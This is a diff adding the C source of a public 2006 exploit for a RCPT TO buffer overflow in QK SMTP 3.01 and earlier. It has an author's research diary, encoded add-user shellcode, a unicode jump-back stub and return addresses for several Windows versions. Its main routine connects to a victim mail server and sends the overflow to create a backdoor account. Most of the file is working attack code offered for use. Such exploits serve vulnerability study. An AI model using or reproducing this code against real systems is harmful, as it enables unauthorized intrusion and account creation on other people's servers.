@@ -1,0 +1,314 @@
+/*
+       _______         ________           .__        _____          __
+___  __\   _  \   ____ \_____  \          |  |__    /  |  |   ____ |  | __
+\  \/  /  /_\  \ /    \  _(__  <   ______ |  |  \  /   |  |__/ ___\|  |/ /
+ >    <\  \_/   \   |  \/       \ /_____/ |   Y  \/    ^   /\  \___|    <
+/__/\_ \\_____  /___|  /______  /         |___|  /\____   |  \___  >__|_ \
+      \/      \/     \/       \/   25\10\06    \/      |__|      \/     \/
+      
+ *   mm.           dM8
+ *  YMMMb.       dMM8      _____________________________________
+ *   YMMMMb     dMMM'     [                                     ]
+ *    `YMMMb   dMMMP      [ There are doors I have yet to open  ]
+ *      `YMMM  MMM'       [ windows I have yet to look through  ]
+ *         "MbdMP         [ Going forward may not be the answer ]
+ *     .dMMMMMM.P         [                                     ]
+ *    dMM  MMMMMM         [       maybe I should go back        ]
+ *    8MMMMMMMMMMI        [_____________________________________]
+ *     YMMMMMMMMM                   www.netbunny.org
+ *       "MMMMMMP
+ *      MxM .mmm
+ *      W"W """
+
+[i] Title:              QK SMTP <= 3.01 RCPT-TO Buffer Overflow Exploit
+[i] Discovered by:      Greg Linares
+[i] Exploit by:         Expanders  -  expanders [aaat] gmail [dooot] com
+[i] References:         http://www.securityfocus.com/bid/20681   ---   http://www.qksoft.com/
+[i] Greatings:          x0n3-h4ck - netbunny
+
+[ Research diary ]
+
+Ok.. I'm ready to write some lines about this exploit..
+I've encountered some problems during development:
+     ESI and ESP points to our buffer, in a memory location that will be contaminated with some bytes after
+     storing our data. result: I coulnt put shellcode directly here because it will be changed.
+     So i had to write a short jmpback unicode-proof shellcode using venetian tecnique.
+     
+     Because of some unknown reasons i was not able to get a socket-based shellcode working..
+     in this exploit I use an ADD USER shellcode.
+
+
+[ Timeline ]
+
+Vendor has been informed and version 3.10b has been released.
+
+[ Notes ]
+
+RETcode type: POINTER TO [ESP]
+To improve realiability you can search your own RETcodes..
+
+[ Documentation ]
+
+Venetian exploit: http://www.net-security.org/dl/articles/unicodebo.pdf
+Skylined Alpha2 : www.edup.tudelft.nl/~bjwever/documentation_alpha2.html.php
+
+[ Special Thanks ]
+
+Skylined
+H D Moore
+Greg Linares
+
+
+[ Links ]
+
+www.x0n3-h4ck.org
+www.netbunny.org
+
+
+
+*/
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <unistd.h>
+
+// You may want to change this, is the user and the password of shellcode added user
+#define NETADD_USER "x0n3"
+#define NETADD_PASS "h4ck"
+
+// Exploit internal constant, change only if you know what you are doing
+#define HELO "EHLO\r\n"
+#define MAIL_FROM "MAIL FROM: <good@ye.com>\r\n"
+#define BUGSTR "RCPT TO: %s@fuck.com>\r\n"
+#define BUFFSIZE 10000
+#define SC_MAX_SIZE 800
+#define MAX_ENCODED_LEN 100
+
+// Offsets
+#define RET_OFFSET       296
+#define JMPBACK_OFFSET   4089
+#define SHELLCODE_OFFSET 2524
+
+int encode_alphanum(unsigned char *src,unsigned char *dest,int len);
+int banner();
+int usage(char *filename);
+int inject(char *port, char *ip);
+int remote_connect( char* ip, unsigned short port );
+
+
+// win32 ADD user un-encoded shellcode taken from metasploit [ tnx hdm & vlas902 ]
+// encoded using Skylined alpha2 tool
+char alphanum_shellcode[] =
+        // Skylined's alpha2 unicode decoder
+        "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABA"
+        "BABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB"
+        // Encoded opcodes
+        "ylzHOTM0KPkP2kQ5OL2kQlKUt8kQzOtK0On82k1OO0KQ8kpIDKoDTKKQXnnQ7P4Y4lU4upptm7i1WZLM"
+        "kQWRJKJTMkpTLdzdt59UdKooktkQzKOv4KlLNkDKooMLyqZKBkMLRkzajKQyQLmTM45sNQUpotRkmplp"
+        "tEupQhlLBkoPlLRkRPKlvMRkoxjhzKKYtKqpFPkPm0KPbkphMlaOlqhvqPPVriJXCS5pCKNpOxJO8Nk0"
+        "C0c8eHKNqzznPW9oyW1SBMotnNaUQhaUkpNOpckpRNOuqdmPRUpsqUPrmP%skp%s"
+        "mPnOQ1OTNdo0mVMVMPpnOurTMP0lBOqS31PlC7prpobU0pkpoQotPmoyPn1YT3ptT2aQPtpo1bBSkp%s"
+        "MPNOOQa4oTkPA";
+
+
+//  Fully customizable UNICODE-PROOF jmpback shellcode
+//  Written with venetian tecnique to jmpback as more as possible using as less as possible bytes
+//  Note that \x73 is "add byte ptr [ebx],dh", ebx point to a useless but writable location so
+//  we can use this instruction as a unicode NOP to realign with our next instruction
+unsigned char jmpback[] =
+        "\x50\x73" // push eax  |
+        "\x54\x73" // push esp  |  Workaroung for "xchg eax,esp" cos 0x96 is filtered
+        "\x58\x73" // pop eax   |____
+        "\xB0" //  mov al,0x0   |  Set last eax byte to zero..
+        "\x48\x73" // dec ax    |  ..and next we decrement eax
+        "\xB0\x48\x73"
+        "\xB0\x48\x73"  //      |  Again...
+        "\xB0\x48\x73"  //      |  ...and angain
+        "\xB0\x48\x73"
+        "\xB0\x48\x73"  //      |  every time it substract 0xFF to eax
+        "\xB0\x48\x73"
+        "\xB0\x48\x73"
+        "\xB0\x48\x73"
+        "\xB0\x48\x73"
+        "\xB0\x48\x73"
+        "\xB0\x48\x73"
+        "\xB0\x48\x73"
+        "\x48\x73"//            |  eax is aligned to the shellcode
+        "\x50\x73" //  push eax
+        "\xC3\x73"; // retn
+
+        //"\x50\x73\xBA\xAA\xAA\x73\x52\x73\xC3\x73";   // push eax = 0xAA00AA00 and retn !!DEBUG!!
+
+
+struct retcodes{char *platform;unsigned long addr;} targets[]= {
+    { "Windows NT Universal", 0x77cec080 },   // shell32.dll push esp, ret  [Tnx to metasploit]
+	{ "Windows 2k SP 4"     , 0x75031dce },   // ws2_32.dll push esp, ret   [Tnx to metasploit]
+	{ "Windows XP SP 0/1"   , 0x71ab7bfb },   // ws2_32.dll jmp esp         [Tnx to metasploit]
+    { "Windows XP SP 2 ENG" , 0x71ab9372 },   // ws2_32.dll push esp, ret   [Tnx to metasploit]
+	{ "Windows XP SP 2 ITA" , 0x77D92CFC },   // user32.dll jmp esp
+	{ NULL }
+};
+int banner() {
+  printf("\n       _______         ________           .__        _____          __     \n");
+  printf("___  __\\   _  \\   ____ \\_____  \\          |  |__    /  |  |   ____ |  | __ \n");
+  printf("\\  \\/  /  /_\\  \\ /    \\  _(__  <   ______ |  |  \\  /   |  |__/ ___\\|  |/ / \n");
+  printf(" >    <\\  \\_/   \\   |  \\/       \\ /_____/ |   Y  \\/    ^   /\\  \\___|    <  \n");
+  printf("/__/\\_ \\\\_____  /___|  /______  /         |___|  /\\____   |  \\___  >__|_ \\ \n");
+  printf("      \\/      \\/     \\/       \\/               \\/      |__|      \\/     \\/ \n\n");
+  printf("[i] Title:        \tQK SMTP Remote RCPT-TO Buffer overflow\n");
+  printf("[i] Discovered by:\tGreg Linares\n");
+  printf("[i] Exploit by:   \tExpanders\n\n");
+  return 0;
+}
+
+int usage(char *filename) {
+  int i;
+  printf("Usage: \t%s <host> <port> <targ>\n\n",filename);
+  printf("       \t<host>   : Victim's host\n");
+  printf("       \t<port>   : Victim's port  ::  Default: 25\n");
+  printf("       \t<targ>   : Target from the list below\n\n");
+  
+  printf("#   \t Platform\n");
+  printf("-----------------------------------------------\n");
+  for(i = 0; targets[i].platform; i++)
+        printf("%d \t %s\n",i,targets[i].platform);
+  printf("-----------------------------------------------\n");
+  exit(0);
+}
+
+
+int remote_connect( char* ip, unsigned short port )
+{
+  int s;
+  struct sockaddr_in remote_addr;
+  struct hostent* host_addr;
+
+  memset ( &remote_addr, 0x0, sizeof ( remote_addr ) );
+  if ( ( host_addr = gethostbyname ( ip ) ) == NULL )
+  {
+   printf ( "[X] Cannot resolve \"%s\"\n", ip );
+   exit ( 1 );
+  }
+  remote_addr.sin_family = AF_INET;
+  remote_addr.sin_port = htons ( port );
+  remote_addr.sin_addr = * ( ( struct in_addr * ) host_addr->h_addr );
+  if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
+  {
+   printf ( "[X] Socket failed!\n" );
+   exit ( 1 );
+  }
+  if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
+  {
+   printf ( "[X] Failed connecting!\n" );
+   exit ( 1 );
+  }
+  return ( s );
+}
+
+int main(int argc, char *argv[]) {
+    int s,position;
+    char encoded_user[MAX_ENCODED_LEN];
+    char encoded_pass[MAX_ENCODED_LEN];
+    unsigned int rcv;
+    char *buffer,*request;
+    char recvbuf[256];
+    char shellcode[SC_MAX_SIZE];
+    banner();
+    if( (argc != 4) || (atoi(argv[2]) < 1) || (atoi(argv[2]) > 65534) )
+        usage(argv[0]);
+    printf("[+] Target OS is: %s\n",targets[atoi(argv[3])].platform);
+    printf("[+] Creating evil buffer...");
+    fflush(stdout);
+    buffer = (char *) malloc(BUFFSIZE);
+    request = (char *) malloc(BUFFSIZE + strlen(BUGSTR));
+    memset(buffer,0x73,BUFFSIZE);  // Fill with unicode nops
+    memset(buffer+4000,0x45,1000);
+    encode_alphanum(encoded_user,NETADD_USER,strlen(NETADD_USER));
+    encode_alphanum(encoded_pass,NETADD_PASS,strlen(NETADD_PASS));
+    sprintf(shellcode,alphanum_shellcode,encoded_user,encoded_pass,encoded_user);
+    memcpy(buffer+RET_OFFSET,&targets[atoi(argv[3])].addr,4);
+    memcpy(buffer+SHELLCODE_OFFSET,shellcode,strlen(shellcode));
+    memcpy(buffer+JMPBACK_OFFSET,jmpback,strlen(jmpback));
+    memset(buffer+4500,0x00,1);
+    printf("done\n");
+    printf("[+] Connecting to remote host\n");
+    s = remote_connect(argv[1],atoi(argv[2]));
+    //rcv=recv(s,recvbuf,256,0);
+    if((rcv = recv(s,recvbuf,256,0)) < 0)
+    {
+     printf("\n[X] Error while recieving banner!\n");
+     exit( 1 );
+    }
+    if (strstr(recvbuf,"QK SMTP")!=0)
+    {
+     sleep(1);
+     sprintf(request,"%s",HELO);
+     printf("[+] Sending EHLO\n");
+     if ( send ( s, request, strlen(request), 0) <= 0 )
+     {
+            printf("[X] Failed to send buffer\n");
+            exit ( 1 );
+     }
+     sleep(1);
+     sprintf(request,"%s",MAIL_FROM);
+     printf("[+] Sending MAIL FROM\n");
+     if ( send ( s, request, strlen(request), 0) <= 0 )
+     {
+            printf("[X] Failed to send buffer\n");
+            exit ( 1 );
+     }
+     sleep(1);
+     sprintf(request,BUGSTR,buffer);
+     printf("[+] Sending EXPLOIT\n");
+     if ( send ( s, request, strlen(request), 0) <= 0 )
+     {
+            printf("[X] Failed to send buffer\n");
+            exit ( 1 );
+     }
+     sleep(1);
+     printf("[+] Done - New account should have been added:\n");
+     printf("[i] LOGIN:\t%s\n",NETADD_USER);
+     printf("[i] PASSWORD:\t%s\n",NETADD_PASS);
+     printf("[+] Exploit now hangs up. see ya.\n\n");
+    } else
+     printf("[X] This server is not running QK SMTP\n");
+    close(s);
+    free(buffer);
+    free(request);
+    return 0;
+}
+
+// Ripped from Skylined's alpha2.c
+int encode_alphanum(unsigned char *dest,unsigned char *src,int len){
+  char dump[2];
+  int   i,n, input, A, B, C, D, E, F;
+  char* valid_chars;
+  struct timeval tv;
+  struct timezone tz;
+  memset(dest,0x00,MAX_ENCODED_LEN);
+  gettimeofday(&tv, &tz);
+  srand((int)tv.tv_sec*1000+tv.tv_usec);
+  valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
+  for(n=0;n<len;n++) {
+    input = src[n];
+    A = (input & 0xf0) >> 4;
+    B = (input & 0x0f);
+    F = B;
+    i = rand() % strlen(valid_chars);
+    while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }
+    E = valid_chars[i] >> 4;
+    D = (A-E) & 0x0f;
+    i = rand() % strlen(valid_chars);
+    while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }
+    C = valid_chars[i] >> 4;
+    sprintf(dump,"%c%c", (C<<4)+D, (E<<4)+F);
+    strcat(dest,dump);
+  }
+  return 0;
+}
+
+// milw0rm.com [2006-10-25]
